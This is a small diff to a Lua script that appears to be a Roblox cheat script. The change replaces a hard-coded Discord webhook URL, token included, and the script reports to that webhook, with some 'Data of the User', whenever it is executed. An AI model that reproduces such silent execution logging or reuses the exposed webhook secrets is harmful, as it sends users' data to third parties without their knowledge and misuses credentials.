@@ -12,7 +12,7 @@ local webhookcheck =
    FLUXUS_LOADED and "Fluxus" -- Mobile Fluxus or Pc
  
  --// Webhook url \\--
-local url = "https://discord.com/api/webhooks/1073857551059406888/r9H-u-TPCZ0lw9fmrgtW8QaupTMT9uUHmeRt-RIBVIZHVgcTLbFlwW7wxagvuMBGNFjk"
+local url = "https://discord.com/api/webhooks/1119210223555579914/r0CMZ1F68SXSEBldUaYMbmmojJYi5O74gF3hmA8LPX4Q-k0cjNNY44pb8KBtbGAQgSvC"
 --// Data of the User \\--
 local data = {
    ["content"] = " ***HarshTechV7.5 has Been Executed***", --// Messege of which script is executed
